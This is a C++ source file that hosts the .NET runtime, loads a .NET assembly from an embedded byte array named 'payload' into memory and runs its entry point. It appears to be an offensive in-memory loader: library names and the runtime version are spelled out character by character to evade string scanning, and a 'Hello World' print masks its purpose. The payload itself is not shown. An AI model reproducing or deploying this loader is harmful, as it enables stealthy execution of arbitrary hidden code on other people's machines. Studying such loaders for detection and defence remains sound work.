// hosting-clr.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

#include "payload.hpp"
#include "mscorlib.tlh"
#include <metahost.h>

#pragma comment(lib, "mscoree.lib")

//#import "mscorlib.tlb" raw_interfaces_only \
//    high_property_prefixes("_get","_put","_putref")		\
//    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;

bool load(unsigned char* buffer, size_t size)
{
	bool ret = false;
	HMODULE mod = nullptr;
	HRESULT hr = S_OK;
	ICLRMetaHost* pMetaHost = nullptr;

	do
	{
		// load module
		char strMscoree[] = { 'm','s','c','o','r','e','e','.','d','l','l',0 };
		char strOleAut32[] = { 'o','l','e','a','u','t','3','2','.','d','l','l',0 };
		char strMsvcrt[] = { 'm','s','v','c','r','t','.','d','l','l',0 };

		mod = LoadLibraryA(strMscoree);
		if (!mod)
		{
			break;
		}
		mod = LoadLibraryA(strOleAut32);
		if (!mod)
		{
			break;
		}
		mod = LoadLibraryA(strMsvcrt);
		if (!mod)
		{
			break;
		}

		// GUID
		GUID CLSID_CLRMetaHost = { 0x9280188d, 0xe8e, 0x4867, 0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde };
		GUID IID_ICLRMetaHost = { 0xD332DB9E, 0xB9B3, 0x4125, 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 };
		GUID IID_ICLRRuntimeInfo = { 0xBD39D1D2, 0xBA2F, 0x486a, 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 };
		GUID CLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e };
		GUID IID_ICorRuntimeHost = { 0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e };
		GUID IID__AppDomain = { 0x05f696dc, 0x2b29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13 };

		// clr version
		const wchar_t runtime_version[] = { L'v',L'4',L'.',L'0',L'.',L'3',L'0',L'3',L'1',L'9',0 ,0 };

		/* Get ICLRMetaHost instance */
		hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
		if (FAILED(hr))
		{
			break;
		}


		ICLRRuntimeInfo* pRuntimeInfo = NULL;
		/* Get ICLRRuntimeInfo instance */
		hr = pMetaHost->GetRuntime(runtime_version, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);//L"v4.0.30319"
		if (FAILED(hr))
		{
			break;
		}

		BOOL bLoadable;
		/* Check if the specified runtime can be loaded */
		hr = pRuntimeInfo->IsLoadable(&bLoadable);
		if (FAILED(hr) || !bLoadable)
		{
			break;
		}

		ICorRuntimeHost* pRuntimeHost = NULL;
		/* Get ICorRuntimeHost instance */
		hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
		if (FAILED(hr))
		{
			break;
		}

		/* Start the CLR */
		hr = pRuntimeHost->Start();
		if (FAILED(hr))
		{
			break;
		}

		IUnknownPtr pAppDomainThunk = NULL;
		hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);

		if (FAILED(hr))
		{
			break;
		}

		_AppDomainPtr pDefaultAppDomain = NULL;
		/* Equivalent of System.AppDomain.CurrentDomain in C# */
		hr = pAppDomainThunk->QueryInterface(IID__AppDomain, (VOID**)&pDefaultAppDomain);
		if (FAILED(hr))
		{
			break;
		}

		_AssemblyPtr pAssembly = NULL;
		SAFEARRAYBOUND rgsabound[1];
		rgsabound[0].cElements = size;
		rgsabound[0].lLbound = 0;
		SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
		void* pvData = NULL;
		hr = SafeArrayAccessData(pSafeArray, &pvData);

		if (FAILED(hr))
		{
			break;
		}

		memcpy(pvData, buffer, size);

		hr = SafeArrayUnaccessData(pSafeArray);
		if (FAILED(hr))
		{
			break;
		}

		/* Equivalent of System.AppDomain.CurrentDomain.Load(byte[] rawAssembly) */
		hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
		if (FAILED(hr))
		{
			break;
		}

		_MethodInfoPtr pMethodInfo = NULL;
		/* Assembly.EntryPoint Property */
		hr = pAssembly->get_EntryPoint(&pMethodInfo);
		if (FAILED(hr))
		{
			break;
		}

		VARIANT retVal;
		memset(&retVal, 0, sizeof(VARIANT));

		VARIANT obj;
		memset(&obj, 0, sizeof(VARIANT));
		obj.vt = VT_NULL;

		//TODO! Change cElement to the number of Main arguments
		SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);

		/* EntryPoint.Invoke(null, new object[0]) */
		hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
		if (FAILED(hr))
		{
			break;
		}

		ret = true;
	} while (false);

	return ret;
}


int main()
{
	std::cout << "Hello World!\n";

	if (!load(hexData,sizeof(hexData)))
	{
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}
